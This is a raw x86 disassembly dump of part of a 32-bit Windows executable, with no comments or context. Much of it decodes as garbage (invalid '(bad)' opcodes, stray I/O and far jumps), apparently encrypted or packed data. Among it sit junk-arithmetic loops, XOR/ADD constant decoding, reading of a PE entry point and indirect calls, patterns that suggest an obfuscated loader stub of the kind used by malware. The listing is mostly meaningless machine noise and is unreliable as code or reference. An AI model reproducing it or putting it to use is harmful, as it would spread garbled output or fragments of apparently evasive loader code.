  4061c7:	dec    esp
  4061c8:	push   edi
  4061c9:	fldcw  WORD PTR [eax-0x52]
  4061cc:	int    0xe
  4061ce:	or     eax,0x532fbde0
  4061d3:	mov    ch,0xe0
  4061d5:	ins    DWORD PTR es:[edi],dx
  4061d6:	(bad)  
  4061d7:	mov    ds:0x89d5fce5,eax
  4061dc:	inc    edx
  4061dd:	pop    es
  4061de:	and    al,0x4c
  4061e0:	pop    DWORD PTR [ebp-0x48d6f341]
  4061e6:	nop
  4061e7:	add    BYTE PTR [edx],bh
  4061e9:	cdq    
  4061ea:	test   eax,0x88fa64af
  4061ef:	sbb    DWORD PTR [ecx],ecx
  4061f1:	ja     0x406265
  4061f3:	fisub  DWORD PTR [edi]
  4061f5:	fidiv  DWORD PTR [ecx-0x30]
  4061f8:	adc    eax,0xcb03ecd2
  4061fd:	sub    bl,BYTE PTR [edx]
  4061ff:	and    bh,bh
  406201:	lock dec edx
  406203:	fcomi  st,st(0)
  406205:	push   ss
  406206:	popa   
  406207:	adc    ebp,eax
  406209:	lock inc esi
  40620b:	in     al,dx
  40620c:	addr16 shr edi,0x2a
  406210:	in     eax,0x15
  406212:	or     DWORD PTR [ebx],eax
  406214:	in     al,0x2f
  406216:	pop    edi
  406217:	cdq    
  406218:	push   eax
  406219:	cmc    
  40621a:	jns    0x406216
  40621c:	sub    BYTE PTR [ebx+0x34],bl
  40621f:	(bad)  
  406220:	mov    cs,WORD PTR [eax-0x1f]
  406223:	xor    eax,0x9ad75a15
  406228:	xchg   ebx,eax
  406229:	sbb    edx,DWORD PTR [ecx+0x6c]
  40622c:	mov    al,BYTE PTR [ebx-0xdafdda3]
  406232:	pop    esi
  406233:	mov    ds:0xa479ad0b,eax
  406238:	cmp    ch,BYTE PTR [ecx+0x73]
  40623b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40623c:	cmp    eax,0x5960cb75
  406241:	xor    BYTE PTR [eax],bh
  406243:	ds jecxz 0x4062c3
  406246:	enter  0xd0e7,0x56
  40624a:	cmp    BYTE PTR [ebp+0x79],al
  40624d:	ins    BYTE PTR es:[edi],dx
  40624e:	sahf   
  40624f:	xchg   ecx,eax
  406250:	sti    
  406251:	jp     0x4062bb
  406253:	cmp    DWORD PTR [ebx+0x23],ebp
  406256:	in     al,dx
  406257:	push   ecx
  406258:	cmp    cl,cl
  40625a:	mov    edi,0xfe003934
  40625f:	loopne 0x406231
  406261:	icebp  
  406262:	scas   al,BYTE PTR es:[edi]
  406263:	leave  
  406264:	xor    esi,eax
  406266:	and    DWORD PTR ds:0x433823,0x0
  406270:	jmp    0x406282
  406275:	mov    ecx,DWORD PTR ds:0x433823
  40627b:	inc    ecx
  40627c:	mov    DWORD PTR ds:0x433823,ecx
  406282:	cmp    DWORD PTR ds:0x433823,0x1d
  406289:	jae    0x4062c6
  40628f:	cmp    DWORD PTR ds:0x433823,0xb
  406296:	jne    0x4062a7
  40629c:	push   0x3d1a
  4062a1:	call   DWORD PTR ds:0x4120c8
  4062a7:	cmp    DWORD PTR ds:0x433823,0xa
  4062ae:	jne    0x4062c1
  4062b4:	mov    ecx,DWORD PTR ds:0x433823
  4062ba:	inc    ecx
  4062bb:	mov    DWORD PTR ds:0x433823,ecx
  4062c1:	jmp    0x406275
  4062c6:	mov    eax,DWORD PTR [edx+0x194]
  4062cc:	mov    ecx,DWORD PTR [eax]
  4062ce:	mov    eax,DWORD PTR [ecx+0x3c]
  4062d1:	mov    eax,DWORD PTR [eax+ecx*1+0x28]
  4062d5:	add    eax,ecx
  4062d7:	mov    DWORD PTR [ebp+0x8],esi
  4062da:	mov    DWORD PTR [ebp+0x10],eax
  4062dd:	mov    eax,DWORD PTR [ebp+0x10]
  4062e0:	pop    esi
  4062e1:	test   eax,eax
  4062e3:	je     0x406656
  4062e9:	push   DWORD PTR ds:0x413c0c
  4062ef:	push   DWORD PTR ds:0x4139b8
  4062f5:	mov    eax,DWORD PTR [edx+0x194]
  4062fb:	push   DWORD PTR [eax]
  4062fd:	mov    eax,DWORD PTR [ebp+0x10]
  406300:	jmp    0x40664f
  406305:	lahf   
  406306:	cmp    al,0x1a
  406308:	push   ds
  406309:	pop    ecx
  40630a:	fcomp  DWORD PTR [ebx-0x2e0ee343]
  406310:	cmc    
  406311:	das    
  406312:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406313:	cmp    eax,0x7e3f54f2
  406318:	jle    0x406346
  40631a:	jge    0x40639a
  40631c:	jle    0x4062ff
  40631e:	mov    dh,0x6d
  406320:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406321:	and    bl,BYTE PTR [edi-0x64]
  406324:	sub    cl,BYTE PTR [esi-0x620d2dc7]
  40632a:	cmp    eax,0xf9bc4699
  40632f:	aas    
  406330:	fisub  DWORD PTR [eax+0x255ad20]
  406336:	pusha  
  406337:	jl     0x406370
  406339:	out    dx,al
  40633a:	or     BYTE PTR [edi],ah
  40633c:	jmp    0x406394
  40633e:	sahf   
  40633f:	out    0xe8,eax
  406341:	std    
  406342:	xchg   edx,eax
  406343:	or     al,0xa5
  406345:	cmp    ecx,DWORD PTR [ebx+0x70]
  406348:	dec    esp
  406349:	and    ebp,DWORD PTR [esi-0x3]
  40634c:	adc    al,0x89
  40634e:	push   ds
  40634f:	inc    edi
  406350:	sar    ebp,1
  406352:	mov    eax,ds:0xc517ee33
  406357:	(bad)  
  406358:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406359:	push   0xffffffae
  40635b:	icebp  
  40635c:	dec    ebp
  40635d:	ins    BYTE PTR es:[edi],dx
  40635e:	pop    esp
  40635f:	inc    edi
  406360:	cmp    DWORD PTR [ebp+0x1],ebp
  406363:	scas   eax,DWORD PTR es:[edi]
  406364:	das    
  406365:	jbe    0x40637d
  406367:	ds xor edi,0xfffffffc
  40636b:	test   DWORD PTR [eax-0x3d09dec2],esi
  406371:	mov    dl,0xeb
  406373:	cvttps2pi mm0,QWORD PTR [ebp+0x19216f0e]
  40637a:	dec    esp
  40637b:	xchg   esp,eax
  40637c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40637d:	imul   edx,DWORD PTR [ecx],0xedcf0c65
  406383:	cmp    DWORD PTR [ecx+0x4b],ebp
  406386:	mov    fs,ebx
  406388:	retf   0x8f9f
  40638b:	and    al,0x26
  40638d:	pop    eax
  40638e:	or     al,0xd9
  406390:	test   al,0x83
  406392:	popa   
  406393:	rcl    DWORD PTR [edx],0x2
  406396:	add    bh,0xa3
  406399:	scas   al,BYTE PTR es:[edi]
  40639a:	ss call 0x6531:0xb91e562e
  4063a2:	nop
  4063a3:	icebp  
  4063a4:	sub    ah,BYTE PTR fs:[esi-0x11bb85b0]
  4063ab:	and    BYTE PTR [ecx-0x2e],bh
  4063ae:	cmp    eax,0xa4f33042
  4063b3:	sbb    edi,DWORD PTR [ebp+ebp*4+0x53a94391]
  4063ba:	jb     0x4063e6
  4063bc:	rol    dh,1
  4063be:	dec    ecx
  4063bf:	les    edi,FWORD PTR [ebx]
  4063c1:	aam    0xd3
  4063c3:	pop    ss
  4063c4:	shr    BYTE PTR [edi-0x6b],0x53
  4063c8:	ror    esp,cl
  4063ca:	repz lea esp,[ebp*4-0x1880f51d]
  4063d2:	cld    
  4063d3:	fadd   DWORD PTR [esi+ecx*2]
  4063d6:	add    dl,BYTE PTR [edi+0x1ccd4d4c]
  4063dc:	imul   ebx,DWORD PTR [ebx-0x65],0x5df48b50
  4063e3:	ret    0x7283
  4063e6:	(bad)  
  4063e7:	cld    
  4063e8:	scas   al,BYTE PTR es:[edi]
  4063e9:	xor    eax,0x9438833e
  4063ee:	mov    dh,0x43
  4063f0:	outs   dx,BYTE PTR ds:[esi]
  4063f1:	outs   dx,BYTE PTR ds:[esi]
  4063f2:	fadd   QWORD PTR [ebp+0x17]
  4063f5:	and    dh,bh
  4063f7:	push   es
  4063f8:	push   ecx
  4063f9:	scas   al,BYTE PTR es:[edi]
  4063fa:	popa   
  4063fb:	mov    esp,ss
  4063fd:	shr    esi,0x5e
  406400:	stos   DWORD PTR es:[edi],eax
  406401:	pop    eax
  406402:	lds    ecx,FWORD PTR [ebx+esi*8+0x68]
  406406:	xchg   ebp,edi
  406408:	push   0x3
  40640a:	cli    
  40640b:	sbb    DWORD PTR [ebp+0x10],0xb3851c09
  406412:	aas    
  406413:	dec    esp
  406414:	ds sti 
  406416:	xor    DWORD PTR [ebx],ebx
  406418:	ss gs dec esp
  40641b:	mov    ds,edx
  40641d:	push   cs
  40641e:	shr    edi,0xc5
  406421:	push   edi
  406422:	pop    es
  406423:	sti    
  406424:	mov    edi,0x9901682b
  406429:	pop    ds
  40642a:	iret   
  40642b:	push   ecx
  40642c:	or     DWORD PTR [ebp+0x1c5467d2],ebp
  406432:	mov    ebp,0xac8603f7
  406437:	stos   BYTE PTR es:[edi],al
  406438:	pop    esi
  406439:	xor    edi,0x20698158
  40643f:	adc    DWORD PTR [ebx-0x39],ebp
  406442:	lods   eax,DWORD PTR ds:[esi]
  406443:	xor    al,0xce
  406445:	call   0xac84:0x7de11f9b
  40644c:	mov    DWORD PTR [ecx+0x5c90e3ea],esp
  406452:	mov    ebp,0x2ad5c9e
  406457:	loopne 0x4063e2
  406459:	out    dx,al
  40645a:	jo     0x406453
  40645c:	leave  
  40645d:	inc    esi
  40645e:	je     0x4063fc
  406460:	hlt    
  406461:	dec    edx
  406462:	push   0xffffffc5
  406464:	clc    
  406465:	fwait
  406466:	ret    
  406467:	daa    
  406468:	inc    edi
  406469:	ret    
  40646a:	repz or eax,0xf7c6b4ab
  406470:	stos   BYTE PTR es:[edi],al
  406471:	inc    ebx
  406472:	jo     0x4064ee
  406474:	sar    BYTE PTR [ecx],cl
  406476:	in     al,dx
  406477:	mov    ebx,0xa9ef9785
  40647c:	add    eax,0x8813bbbc
  406481:	cli    
  406482:	xor    eax,0xbe45cc92
  406487:	sti    
  406488:	ds ds lahf 
  40648b:	and    al,BYTE PTR [esi]
  40648d:	dec    esp
  40648e:	pushf  
  40648f:	(bad)  
  406490:	in     al,dx
  406491:	jns    0x406420
  406493:	adc    ecx,edx
  406495:	xchg   ebx,eax
  406496:	mov    ch,0xfb
  406498:	jbe    0x4064e0
  40649a:	mov    esp,0x358f15f
  40649f:	add    edx,esi
  4064a1:	xchg   ebx,eax
  4064a2:	clc    
  4064a3:	test   DWORD PTR [eax],ebp
  4064a5:	rcl    ebp,1
  4064a7:	(bad)  
  4064a8:	repnz push ebp
  4064aa:	xchg   edx,eax
  4064ab:	repz jl 0x406452
  4064ae:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4064af:	xchg   DWORD PTR [edx-0x28321edc],eax
  4064b5:	lock aam 0x2e
  4064b8:	retf   0x3c3d
  4064bb:	mov    esp,0xee4de71d
  4064c0:	stos   BYTE PTR es:[edi],al
  4064c1:	sti    
  4064c2:	add    ebp,DWORD PTR [eax+0x7c]
  4064c5:	push   ss
  4064c6:	cs adc eax,edx
  4064c9:	xor    BYTE PTR [eax-0x6c],bl
  4064cc:	fst    DWORD PTR [esi+0x4d]
  4064cf:	in     al,0x5e
  4064d1:	test   DWORD PTR [ebx-0x42],ebp
  4064d4:	loopne 0x4064ac
  4064d6:	pushf  
  4064d7:	inc    ebp
  4064d8:	pushf  
  4064d9:	mov    edi,edx
  4064db:	imul   ecx,edi,0xffffff83
  4064de:	jmp    0x40651d
  4064e0:	pop    ds
  4064e1:	pop    ecx
  4064e2:	mov    ds:0x341bc363,al
  4064e7:	adc    BYTE PTR [ebx+0x5c23a516],dl
  4064ed:	bound  esi,QWORD PTR [ecx-0x29]
  4064f0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4064f1:	sbb    al,0xce
  4064f3:	jmp    0x8bd8:0x6b4c1c80
  4064fa:	push   ebx
  4064fb:	enter  0x5ba3,0x10
  4064ff:	xchg   edi,eax
  406500:	xor    eax,0x89f6c194
  406505:	mov    edx,edi
  406507:	jb     0x406564
  406509:	scas   al,BYTE PTR es:[edi]
  40650a:	cmp    al,0x2e
  40650c:	push   ss
  40650d:	mov    ch,0x7f
  40650f:	jle    0x4064b4
  406511:	test   al,0x87
  406513:	pop    esi
  406514:	xor    DWORD PTR [eax-0xb4a0a6c],edi
  40651a:	ds ret 
  40651c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40651d:	cmp    bl,cl
  40651f:	lock fs cmp al,0x45
  406523:	in     eax,dx
  406524:	js     0x40658a
  406526:	enter  0xfeb6,0x13
  40652a:	jmp    0x406540
  40652c:	inc    bp
  40652e:	inc    ebx
  40652f:	ds loopne 0x406516
  406532:	cmp    BYTE PTR [ebx],cl
  406534:	(bad)  
  406535:	xchg   edi,eax
  406536:	stc    
  406537:	out    dx,al
  406538:	cwde   
  406539:	sbb    DWORD PTR [ebp-0x7e],0xfffffff5
  40653d:	xor    BYTE PTR [ecx],al
  40653f:	mov    BYTE PTR [edx+eiz*4-0x40608c42],0xfb
  406547:	ins    DWORD PTR es:[edi],dx
  406548:	int3   
  406549:	in     al,dx
  40654a:	xor    BYTE PTR [edi-0x34b887ff],ah
  406550:	(bad)  
  406551:	xor    esi,esi
  406553:	nop
  406554:	and    al,BYTE PTR [eax]
  406556:	mov    bl,0xa1
  406558:	imul   ecx,DWORD PTR [eax-0x12],0x8bfedb72
  40655f:	push   0x132c874d
  406564:	retf   0x179a
  406567:	loop   0x4065d3
  406569:	or     BYTE PTR [esi-0x52],0xe5
  40656d:	push   esi
  40656e:	enter  0xc435,0x83
  406572:	jnp    0x40653f
  406574:	fnstsw WORD PTR [esi+eiz*8]
  406577:	mov    bl,0xb1
  406579:	jno    0x406577
  40657b:	jo     0x406599
  40657d:	mov    ?,ebx
  40657f:	not    DWORD PTR [edi-0xd1645e2]
  406585:	xchg   ecx,edx
  406587:	fbld   TBYTE PTR [ebx+edi*8+0x6b5aa989]
  40658e:	inc    eax
  40658f:	and    eax,0x78841ba9
  406594:	imul   ebx,DWORD PTR [eax+edx*1-0x30],0x65
  406599:	mov    dl,0x70
  40659b:	pop    eax
  40659c:	outs   dx,DWORD PTR ds:[esi]
  40659d:	fwait
  40659e:	shl    BYTE PTR [edi-0x63],cl
  4065a1:	cmp    cl,ah
  4065a3:	or     BYTE PTR [ebx],0x6e
  4065a6:	sub    eax,0xf34f376
  4065ab:	push   esi
  4065ac:	mov    dh,0x87
  4065ae:	mov    eax,0x541ee03c
  4065b3:	(bad)  
  4065b4:	icebp  
  4065b5:	les    eax,FWORD PTR [esi+0x30]
  4065b8:	jmp    0x9c4c1ab
  4065bd:	jb     0x40657a
  4065bf:	mov    ecx,0xf939c9c7
  4065c4:	jmp    0xc060:0xaa059124
  4065cb:	and    al,0xa3
  4065cd:	inc    esp
  4065ce:	sbb    al,0x47
  4065d0:	push   edi
  4065d1:	imul   ebp,eax,0x7db1aec6
  4065d7:	stos   WORD PTR es:[edi],ax
  4065d9:	push   es
  4065da:	stc    
  4065db:	cmp    al,0xec
  4065dd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4065de:	aas    
  4065df:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4065e0:	xlat   BYTE PTR ds:[ebx]
  4065e1:	cmc    
  4065e2:	jnp    0x40659a
  4065e4:	add    ebp,ebp
  4065e6:	js     0x406610
  4065e8:	jge    0x40663c
  4065ea:	push   edi
  4065eb:	and    DWORD PTR [ebx-0x428f71d7],esi
  4065f1:	(bad)  
  4065f3:	or     BYTE PTR [ecx+0x79],bl
  4065f6:	sbb    BYTE PTR [ecx+0x5f],dl
  4065f9:	popa   
  4065fa:	add    al,0x66
  4065fc:	sahf   
  4065fd:	mov    esi,0xd655f6c8
  406602:	imul   ebx,edi,0xc0efb60
  406608:	imul   edi,DWORD PTR [esi+0xaf10413],0xffffffd7
  40660f:	jp     0x4065b4
  406611:	sbb    al,0x4e
  406613:	fsubrp st(3),st
  406615:	cld    
  406616:	in     eax,0xaa
  406618:	push   0xffffffe5
  40661a:	into   
  40661b:	int3   
  40661c:	or     ah,BYTE PTR [edx+edx*8-0x15]
  406620:	js     0x40668d
  406622:	pop    esp
  406623:	fistp  DWORD PTR [ebp-0x2c]
  406626:	adc    eax,0x6c1cf75e
  40662b:	lods   eax,DWORD PTR ds:[esi]
  40662c:	push   0xffffff9a
  40662e:	jae    0x406683
  406630:	mov    esi,0xb56356b2
  406635:	push   ds
  406636:	loope  0x4066a9
  406638:	sub    BYTE PTR [edx-0x5f],ah
  40663b:	cwde   
  40663c:	test   DWORD PTR [ebx+0xa45733b],eax
  406642:	je     0x40661d
  406644:	daa    
  406645:	inc    edi
  406646:	jmp    0x799d81ef
  40664b:	ds xchg edx,eax
  40664d:	mov    edi,0xe9d0ffe8
  406652:	add    eax,DWORD PTR [eax]
  406654:	add    BYTE PTR [eax],al
  406656:	mov    eax,DWORD PTR [ebp+0x10]
  406659:	leave  
  40665a:	ret    0xc
  40665d:	push   ebp
  40665e:	mov    ebp,esp
  406660:	sub    esp,0x28
  406663:	push   0x413cb4
  406668:	call   DWORD PTR ds:0x412408
  40666e:	mov    DWORD PTR ds:0x4336fb,0x6571
  406678:	cmp    WORD PTR [eax],0x0
  40667c:	jne    0x406afe
  406682:	push   0x413d04
  406687:	call   DWORD PTR ds:0x412404
  40668d:	mov    DWORD PTR ds:0x4337d3,0x5ed5
  406697:	cmp    BYTE PTR [eax],0x0
  40669a:	mov    DWORD PTR ds:0x4337a7,0x18c3
  4066a4:	jne    0x406b09
  4066aa:	mov    DWORD PTR [ebp-0x8],0xf89c8531
  4066b1:	mov    DWORD PTR [ebp-0x4],0xf89c8532
  4066b8:	lea    eax,[ebp-0x20]
  4066bb:	mov    DWORD PTR [ebp-0x14],eax
  4066be:	lea    eax,[ebp-0x1c]
  4066c1:	and    DWORD PTR ds:0x4337e3,0x0
  4066cb:	mov    ecx,DWORD PTR ds:0x4337e3
  4066d1:	inc    ecx
  4066d2:	mov    DWORD PTR ds:0x4337e3,ecx
  4066d8:	cmp    DWORD PTR ds:0x4337e3,0x5
  4066df:	jne    0x4066f8
  4066e5:	push   0x2ad8
  4066ea:	push   DWORD PTR [ebp-0x1c]
  4066ed:	push   0x433903
  4066f2:	call   DWORD PTR ds:0x412340
  4066f8:	cmp    DWORD PTR ds:0x4337e3,0x4
  4066ff:	jne    0x406714
  406705:	xor    ecx,ecx
  406707:	or     ecx,DWORD PTR ds:0x4337e3
  40670d:	inc    ecx
  40670e:	mov    DWORD PTR ds:0x4337e3,ecx
  406714:	cmp    DWORD PTR ds:0x4337e3,0x1f
  40671b:	jb     0x4066cb
  406721:	movzx  ecx,WORD PTR ds:0x4337d7
  406728:	and    ecx,DWORD PTR ds:0x43370f
  40672e:	mov    DWORD PTR ds:0x4337d7,ecx
  406734:	mov    DWORD PTR [ebp-0x10],eax
  406737:	adc    DWORD PTR ds:0x43371b,ecx
  40673d:	mov    eax,ds:0x413b34
  406742:	sbb    ecx,DWORD PTR ds:0x43382b
  406748:	mov    eax,DWORD PTR [eax+0x1c8]
  40674e:	mov    eax,DWORD PTR [eax]
  406750:	sub    DWORD PTR ds:0x433713,ebx
  406756:	mov    ecx,DWORD PTR [ebp-0x10]
  406759:	push   ebx
  40675a:	xor    DWORD PTR ds:0x43376b,edx
  406760:	push   esi
  406761:	and    DWORD PTR ds:0x433707,0x0
  40676b:	jmp    0x40677d
  406770:	mov    ebx,DWORD PTR ds:0x433707
  406776:	inc    ebx
  406777:	mov    DWORD PTR ds:0x433707,ebx
  40677d:	cmp    DWORD PTR ds:0x433707,0x1b
  406784:	jae    0x4067ac
  40678a:	cmp    DWORD PTR ds:0x433707,0x23
  406791:	jne    0x4067a7
  406797:	push   0x433933
  40679c:	push   DWORD PTR [ebp-0x18]
  40679f:	push   0x0
  4067a1:	call   DWORD PTR ds:0x412344
  4067a7:	jmp    0x406770
  4067ac:	mov    esi,0x7510854
  4067b1:	sub    DWORD PTR ds:0x4337ab,0x6a10
  4067bb:	xor    eax,esi
  4067bd:	adc    DWORD PTR ds:0x433797,0x4337a7
  4067c7:	push   edi
  4067c8:	mov    edi,0x32729b
  4067cd:	add    eax,edi
  4067cf:	mov    ebx,0x337e
  4067d4:	mov    DWORD PTR [ecx],eax
  4067d6:	mov    eax,ds:0x413e08
  4067db:	cmp    eax,0x23c13046
  4067e0:	mov    eax,DWORD PTR [ebp-0x4]
  4067e3:	mov    ebx,0xf89c853d
  4067e8:	je     0x406824
  4067ee:	or     ecx,DWORD PTR ds:0x4337d3
  4067f4:	mov    ecx,DWORD PTR [ebp-0x8]
  4067f7:	sbb    DWORD PTR ds:0x43376b,0x4ed6
  406801:	xor    eax,esi
  406803:	add    eax,edi
  406805:	sbb    DWORD PTR ds:0x433713,0x43379f
  40680f:	imul   eax,ecx
  406812:	mov    DWORD PTR [ebp-0x8],eax
  406815:	mov    DWORD PTR ds:0x433707,0x49d5
  40681f:	jmp    0x4068d7
  406824:	or     ecx,DWORD PTR ds:0x4337af
  40682a:	xor    eax,esi
  40682c:	and    ecx,0x6df5
  406832:	add    eax,edi
  406834:	xor    ecx,ecx
  406836:	add    ecx,DWORD PTR ds:0x4337e3
  40683c:	and    DWORD PTR ds:0x4337a7,ecx
  406842:	mov    ds:0x413c48,eax
  406847:	mov    ecx,DWORD PTR ds:0x43382b
  40684d:	or     DWORD PTR ds:0x4337e3,ecx
  406853:	mov    eax,DWORD PTR [ebp-0x8]
  406856:	add    DWORD PTR ds:0x43375b,0x62ed
  406860:	xor    eax,esi
  406862:	and    DWORD PTR ds:0x43381f,ebx
  406868:	add    eax,edi
  40686a:	mov    ecx,DWORD PTR ds:0x4337ab
  406870:	sub    DWORD PTR ds:0x4337d3,ecx
  406876:	mov    ds:0x413e08,eax
  40687b:	sbb    ecx,ecx
  40687d:	mov    eax,DWORD PTR [ebp-0x4]
  406880:	and    DWORD PTR ds:0x43370b,ecx
  406886:	mov    ecx,DWORD PTR ds:0x413c48
  40688c:	sbb    DWORD PTR ds:0x433707,0x486c
  406896:	xor    eax,esi
  406898:	adc    DWORD PTR ds:0x433713,0x6147
  4068a2:	add    eax,edi
  4068a4:	cmp    ecx,eax
  4068a6:	mov    DWORD PTR ds:0x43370f,0x4c28
  4068b0:	jne    0x4068d7
  4068b6:	sub    DWORD PTR ds:0x433723,0x43382b
  4068c0:	push   ebx
  4068c1:	or     DWORD PTR ds:0x43379b,0x4337df
  4068cb:	push   DWORD PTR [ebp-0x4]
  4068ce:	push   DWORD PTR [ebp-0x8]
  4068d1:	call   DWORD PTR ds:0x413c40
  4068d7:	mov    eax,ds:0x413b34
  4068dc:	mov    eax,DWORD PTR [eax+0x18c]
  4068e2:	and    DWORD PTR ds:0x4337e7,0x433793
  4068ec:	mov    eax,DWORD PTR [eax]
  4068ee:	mov    DWORD PTR [ebp-0x18],eax
  4068f1:	mov    DWORD PTR [ebp-0x10],ebx
  4068f4:	or     DWORD PTR ds:0x433753,0x1d95
  4068fe:	mov    DWORD PTR [ebp-0x10],ebx
  406901:	sub    DWORD PTR ds:0x43375b,0x4337ef
  40690b:	mov    DWORD PTR [ebp-0x10],ebx
  40690e:	sub    DWORD PTR ds:0x4337ab,0x43376f
  406918:	mov    DWORD PTR [ebp-0x10],0xf89c8531
  40691f:	and    DWORD PTR ds:0x43375b,0x43379b
  406929:	mov    DWORD PTR [ebp-0x28],ebx
  40692c:	dec    DWORD PTR ds:0x4336fb
  406932:	mov    DWORD PTR [ebp-0x28],0xf89c8539
  406939:	mov    ebx,DWORD PTR [ebp-0x8]
  40693c:	adc    DWORD PTR ds:0x4336fb,0x433723
  406946:	xor    ebx,esi
  406948:	add    ebx,edi
  40694a:	jmp    0x4069ee
  40694f:	not    DWORD PTR ds:0x4337db
  406955:	mov    eax,DWORD PTR [ebp-0x4]
  406958:	xor    eax,esi
  40695a:	lea    eax,[eax+ebx*1+0x32729b]
  406961:	push   eax
  406962:	mov    eax,DWORD PTR [ebp-0x10]
  406965:	xor    eax,esi
  406967:	lea    eax,[ebp+eax*1+0x3272a3]
  40696e:	push   eax
  40696f:	adc    DWORD PTR ds:0x4336ff,0x8003
  406979:	mov    eax,ds:0x413b34
  40697e:	xor    DWORD PTR ds:0x4337ef,0x2bd0
  406988:	push   DWORD PTR [eax+0x1bc]
  40698e:	call   0x40f058
  406993:	mov    eax,DWORD PTR [ebp-0x4]
  406996:	add    ecx,0x2fd0
  40699c:	xor    eax,esi
  40699e:	and    DWORD PTR ds:0x43381b,0x0
  4069a8:	mov    ecx,DWORD PTR ds:0x43381b
  4069ae:	inc    ecx
  4069af:	mov    DWORD PTR ds:0x43381b,ecx
  4069b5:	cmp    DWORD PTR ds:0x43381b,0x17
  4069bc:	jne    0x4069c8
  4069c2:	call   DWORD PTR ds:0x4120cc
  4069c8:	cmp    DWORD PTR ds:0x43381b,0x11
  4069cf:	jb     0x4069a8
  4069d5:	mov    ecx,DWORD PTR ds:0x433797
  4069db:	adc    ecx,DWORD PTR ds:0x43375f
  4069e1:	mov    DWORD PTR ds:0x433797,ecx
  4069e7:	lea    ebx,[ebx+eax*1+0x32729b]
  4069ee:	mov    eax,DWORD PTR [ebp-0x4]
  4069f1:	mov    ecx,DWORD PTR [ebp-0x4]
  4069f4:	xor    ecx,esi
  4069f6:	xor    eax,esi
  4069f8:	add    eax,ecx
  4069fa:	mov    ecx,DWORD PTR [ebp-0x4]
  4069fd:	xor    ecx,esi
  4069ff:	lea    eax,[eax+ecx*1+0x9757d1]
  406a06:	cmp    ebx,eax
  406a08:	jbe    0x40694f
  406a0e:	mov    eax,DWORD PTR [ebp+0xc]
  406a11:	mov    ds:0x4139b8,eax
  406a16:	mov    eax,DWORD PTR [ebp+0x10]
  406a19:	mov    ds:0x413c0c,eax
  406a1e:	mov    eax,ds:0x4139b8
  406a23:	mov    ecx,DWORD PTR [ebp-0x14]
  406a26:	push   DWORD PTR [ebp-0x18]
  406a29:	sub    eax,edi
  406a2b:	push   DWORD PTR [ebp-0x1c]
  406a2e:	xor    eax,esi
  406a30:	mov    DWORD PTR [ecx],eax
  406a32:	push   DWORD PTR [ebp-0x20]
  406a35:	call   0x40d59f
  406a3a:	sub    eax,edi
  406a3c:	xor    eax,esi
  406a3e:	mov    DWORD PTR [ebp+0xc],eax
  406a41:	mov    ecx,DWORD PTR [ebp-0x4]
  406a44:	mov    eax,DWORD PTR [ebp+0xc]
  406a47:	xor    ecx,esi
  406a49:	add    ecx,edi
  406a4b:	xor    edx,edx
  406a4d:	div    ecx
  406a4f:	mov    ecx,DWORD PTR [ebp-0x8]
  406a52:	cmp    ecx,eax
  406a54:	jne    0x406a5f
  406a5a:	call   0x401000
  406a5f:	lea    eax,[ebp+0x4]
  406a62:	mov    DWORD PTR [ebp-0x24],eax
  406a65:	mov    eax,ds:0x413b34
  406a6a:	push   0x4
  406a6c:	add    eax,0x1cc
  406a71:	push   eax
  406a72:	lea    eax,[ebp-0xc]
  406a75:	push   eax
  406a76:	call   0x40f058
  406a7b:	mov    eax,DWORD PTR [ebp-0xc]
  406a7e:	mov    eax,DWORD PTR [ebp-0x4]
  406a81:	mov    eax,DWORD PTR [ebp-0x8]
  406a84:	mov    DWORD PTR [ebp+0xc],eax
  406a87:	mov    eax,ds:0x413bb8
  406a8c:	mov    ecx,DWORD PTR [ebp+0xc]
  406a8f:	sub    eax,edi
  406a91:	xor    eax,esi
  406a93:	cmp    eax,ecx
  406a95:	je     0x406adc
  406a9b:	mov    eax,ds:0x413bb0
  406aa0:	mov    ecx,DWORD PTR [ebp+0xc]
  406aa3:	sub    eax,edi
  406aa5:	xor    eax,esi
  406aa7:	cmp    eax,ecx
  406aa9:	jne    0x406abf
  406aaf:	mov    eax,ds:0x413bb8
  406ab4:	add    eax,DWORD PTR ds:0x413bb0
  406aba:	jmp    0x406ac6
  406abf:	mov    eax,DWORD PTR [ebp+0xc]
  406ac2:	xor    eax,esi
  406ac4:	add    eax,edi
  406ac6:	mov    ds:0x413bb0,eax
  406acb:	mov    eax,DWORD PTR [ebp+0xc]
  406ace:	xor    eax,esi
  406ad0:	add    eax,edi
  406ad2:	mov    ds:0x413bb8,eax
  406ad7:	jmp    0x406ae6
  406adc:	mov    eax,ds:0x413bb8
  406ae1:	mov    ds:0x413bb0,eax
  406ae6:	mov    eax,DWORD PTR [ebp-0x24]
  406ae9:	mov    ecx,DWORD PTR ds:0x413bb0
  406aef:	add    DWORD PTR [eax],ecx
  406af1:	mov    eax,DWORD PTR [ebp-0xc]
  406af4:	mov    eax,DWORD PTR [eax]
  406af6:	pop    edi
  406af7:	pop    esi
  406af8:	pop    ebx
  406af9:	jmp    0x406b0b
  406afe:	push   0x87687689
  406b03:	call   DWORD PTR ds:0x412364
  406b09:	xor    eax,eax
  406b0b:	leave  
  406b0c:	ret    0xc
  406b0f:	push   ebp
  406b10:	mov    ebp,esp
  406b12:	push   ecx
  406b13:	mov    DWORD PTR ds:0x433793,0x272d
  406b1d:	push   ecx
  406b1e:	mov    eax,0x5a3fc98
  406b23:	mov    DWORD PTR [ebp-0x4],eax
  406b26:	mov    DWORD PTR ds:0x433767,ecx
  406b2c:	mov    ecx,DWORD PTR [ebp-0x4]
  406b2f:	mov    DWORD PTR ds:0x433793,0x4de2
  406b39:	mov    DWORD PTR [ebp-0x8],0x4ec1
  406b40:	mov    DWORD PTR ds:0x43370f,0x33b9
  406b4a:	cmp    ecx,eax
  406b4c:	jne    0x40734f
  406b52:	or     ecx,DWORD PTR ds:0x43379b
  406b58:	mov    ax,WORD PTR [ebp-0x8]
  406b5c:	sbb    DWORD PTR ds:0x43371b,ebx
  406b62:	mov    ecx,0x8a3c
